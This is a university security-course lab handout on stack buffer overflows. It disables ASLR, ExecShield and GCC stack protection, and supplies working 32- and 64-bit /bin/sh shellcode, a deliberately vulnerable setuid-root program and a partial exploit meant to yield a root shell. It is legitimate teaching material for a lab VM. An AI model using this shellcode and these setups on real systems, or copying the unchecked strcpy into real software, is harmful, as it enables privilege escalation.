# **Lab 2.3** Buffer Overflow Vulnerability

#### **Overview**

The learning objective of this lab is for students to gain the first-hand experience on buffer-overflow vulnerability by  putting what they have learned about the vulnerability from class into  actions. Buffer overflow is defined as the condition in which a program  attempts to write data beyond the boundaries of pre-allocated fixed  length buffers. This vulnerability can be utilized by a malicious user  to alter the flow control of the program, even execute arbitrary pieces  of code. This vulnerability arises due to the mixing of the storage for  data (e.g. buffers) and the storage for controls (e.g. return  addresses): an overflow in the data part can affect the control flow of  the program, because an overflow can change the return address. 

In this lab, you will be given a program with a  buffer-overflow vulnerability; your task is to develop a scheme to  exploit the vulnerability and finally to gain the root privilege. It  uses Ubuntu VM created in Lab 2.1. Ubuntu 12.04 is recommended.

#### **Linux Security Mechanism**s

Ubuntu and other Linux distributions have  implemented several security mechanisms to make the buffer-overflow  attack difficult. To simply our attacks, we need to disable them first.

- **Address Space Randomization.**  Ubuntu and several other Linux-based systems uses address space  randomization to randomize the starting address of heap and stack. This  makes guessing the exact addresses difficult; guessing addresses is one  of the critical steps of buffer-overflow attacks. In this lab, we  disable these features using the following commands:

  ```shell
  $ su root
    Password: (enter root password)
  # sysctl -w kernel.randomize_va_space=0
  ```

- **ExecShield Protection.** Fedora  linux implements a protection mechanism called ExecShield by default,  but Ubuntu systems do not have this protection by default. ExecShield  essentially disallows executing any code that is stored in the stack. As a result, buffer-overflow attacks will not work. To disable ExecShield  in Fedora, you may use the following command.

  ```shell
  $ su root
    Password: (enter root password)
  # sysctl -w kernel.exec-shield=0
  ```

#### **GCC Security Mechanism**s

- **The StackGuard Protection Scheme.** The GCC compiler implements a security mechanism called "Stack Guard"  to prevent buffer overflows. In the presence of this protection, buffer  overflow will not work. You can disable this protection when you are  comiling the program using the switch *-fno-stack-protector*. For example, to compile a program example.c with Stack Guard disabled, you may use the following command:

  ```shell
  $ gcc -fno-stack-protector example.c
  ```

- **Non-Executable Stack.** Ubuntu used to allow executable stacks, but this has now changed: the binary images of programs (and shared libraries) must declare whether they require  executable stacks or not, i.e., they need to mark a field in the program header. Kernel or dynamic linker uses this marking to decide whether to make the stack of this running program executable or non-executable.  This marking is done automatically by the recent versions of gcc, and by default, the stack is set to be non-executable. To change that, use the following option when compiling programs:

  ```shell
  For executable stack:
  $ gcc -z execstack -o test test.c
  
  For non-executable stack:$ gcc -z noexecstack -o test test.c            
  ```

#### **Shellcode**s

Before you start the attack, you need a shellcode. A shellcode is the code to launch a shell. It has to be loaded into the memory so that we can force the vulnerable program to jump to it. Consider the following program: 

```c
#include <stdio.h>
int main( ) {
  char *name[2];
  
  name[0] = ''/bin/sh'';
  name[1] = NULL;
  execve(name[0], name, NULL);
}
```

The shellcode that we use is just the assembly version of the above  program. The following program shows you how to launch a shell by  executing a shellcode stored in a buffer. Please compile and run the  following code, and see whether a shell is invoked.

1. **For 32bit** 

2. ```c
   /*call_shellcode.c*/
   /*for linux 32bit*/
   /*A program that creates a file containing code for launching shell*/
   #include <stdlib.h>
   #include <stdio.h>
   const char code[] =
     "\x31\xc0" /*Line 1: xorl %eax,%eax*/
     "\x50" /*Line 2: pushl %eax*/
     "\x68""//sh" /*Line 3: pushl $0x68732f2f*/
     "\x68""/bin" /*Line 4: pushl $0x6e69622f*/
     "\x89\xe3" /*Line 5: movl %esp,%ebx*/
     "\x50" /*Line 6: pushl %eax*/
     "\x53" /*Line 7: pushl %ebx*/
     "\x89\xe1" /*Line 8: movl %esp,%ecx*/
     "\x99" /*Line 9: cdq*/
     "\xb0\x0b" /*Line 10: movb $0x0b,%al*/
     "\xcd\x80" /*Line 11: int $0x80*/
     ;
   int main(int argc, char **argv)
   {
     char buf[sizeof(code)];
     strcpy(buf, code);
     ((void(*)( ))buf)( );
   }            
   ```

3. A few places in this shellcode are worth mentioning. First, the third instruction pushes "//sh", rather than "/sh" into the stack. This is  because we need a 32-bit number here, and "/sh" has only 24 bits.  Fortunately, "//" is equivalent to "/", so we can get away with a double slash symbol. Second, before calling the execve() system call, we need  to store name[0] (the address of the string), name (the address of  the< array), and NULL to the %ebx, %ecx, and %edx registers,  respectively. Line 5 stores name[0] to %ebx; Line 8 stores name to %ecx; Line 9 sets %edx to zero. There are other ways to set %edx to zero  (e.g., xorl %edx, %edx); the one (cdq) used here is simply a shorter  instruction: it copies the sign (bit 31) of the value in the EAX  register (which is 0 at this point) into every bit position in the EDX  register, basically setting %edx to 0. Third, the system call execve()  is called when we set %al to 11 and execute "int $0x80".

1. **For 64bit** 

2. ```c
   /*call_shellcode.c*/
   /*for linux 64bit*/
   /*A program that creates a file containing code for launching shell*/
   #include <stdlib.h>
   #include <stdio.h>
   const char code[] =
     "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x6a\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
     ;
   int main(int argc, char **argv)
   {
     char buf[sizeof(code)];
     strcpy(buf, code);
     ((void(*)( ))buf)( );
   }
   ```

3. More details you can get from [link](http://www.blackhatlibrary.net/Alphanumeric_shellcode#Starting_shellcode_.2864-bit_execve_.2Fbin.2Fsh.29).

Please use the following command to compile the code (don't forget the execstack option):

```shell
$ gcc -z execstack -o call_shellcode call_shellcode
```

#### Steps

1. Initial setup. Disable Address Space Randomization.

2. To create Vulnerable Program, type the following:

   ```c
   /*stack.c*/
   /*This program has a buffer overflow vulnerability.*/
   /*Our task is to exploit this vulnerability*/
   #include <stdlib.h>
   #include <stdio.h>
   #include <string.h>
   int bof(char *str)
   {
     char buffer[12];
     
     /*The following statement has a buffer overflow problem*/
     strcpy(buffer, str);
     return 1;
   }
   int main(int argc, char **argv)
   {
     char str[517];
     FILE *badfile;
     
     badfile = fopen("badfile", "r");
     fread(str, sizeof(char), 517, badfile);
     bof(str);
     printf("Returned Properly\n");
     return 1;
   }
   ```

3. Compile the Vulnerable Program and make it  set-root-uid. You can achieve this by compiling it in the root account,  and chmod the executable to 4755:

   ```shell
   $ su root
     Password (enter root password)
   # gcc -o stack -z execstack -fno-stack-protector stack.c
   # chmod 4755 stack
   # exit
   ```

4. Complete the vulnerability code. We provide you  with a partially completed exploit code called "exploit.c". The goal of  this code is to construct contents for "badfile". In this code, the  shellcode is given to you. You need to develop the rest.

   ```c
   /*exploit.c*/
   /*A program that creates a file containing code for launching shell*/
   #include <stdlib.h>
   #include <stdio.h>
   #include <string.h>
   /*Shellcode as follow is for linux 32bit. If your linux is a 64bit system, you need to replace "code[]" with the 64bit shellcode we talked above.*/
   const char code[] =
     "\x31\xc0" /*Line 1: xorl %eax,%eax*/
     "\x50" /*Line 2: pushl %eax*/
     "\x68""//sh" /*Line 3: pushl $0x68732f2f*/
     "\x68""/bin" /*Line 4: pushl $0x6e69622f*/
     "\x89\xe3" /*Line 5: movl %esp,%ebx*/
     "\x50" /*Line 6: pushl %eax*/
     "\x53" /*Line 7: pushl %ebx*/
     "\x89\xe1" /*Line 8: movl %esp,%ecx*/
     "\x99" /*Line 9: cdq*/
     "\xb0\x0b" /*Line 10: movb $0x0b,%al*/
     "\xcd\x80" /*Line 11: int $0x80*/
     ;
   void main(int argc, char **argv) { 
     char buffer[517]; 
     FILE *badfile;
     
     /* Initialize buffer with 0x90 (NOP instruction) */
     memset(&buffer, 0x90, 517);
     
     /* You need to fill the buffer with appropriate contents here */
     
     /* Save the contents to the file "badfile" */
     badfile = fopen("./badfile", "w");
     fwrite(buffer, 517, 1, badfile);
     fclose(badfile);
     }
   ```

5. After you finish the above program, compile and  run it. This will generate the contents for "badfile". Then run the  vulnerable program stack. If your exploit is implemented correctly, you  should be able to get a root shell:

   ```shell
   $ gcc -o exploit exploit.c
   $./exploit // create the badfile
   $./stack // launch the attack by running the vulnerable program
   # <---- Bingo! You've got a root shell!
   ```

6. Test the result. Type as follow:

   ```shell
   # whoami
   ```

#### Deliverables

Send it to TA ([liuyuchen0921@zju.edu.cn](mailto:liuyuchen0921@zju.edu.cn)) before **2021.7.4 23:59:59**, with title: **SP2021-LAB2.3-ID-NAME**

- Your **lab** **report** will be the summary of detailed steps and observations in one PDF document. Some screenshots or photoes is included.
- Source code.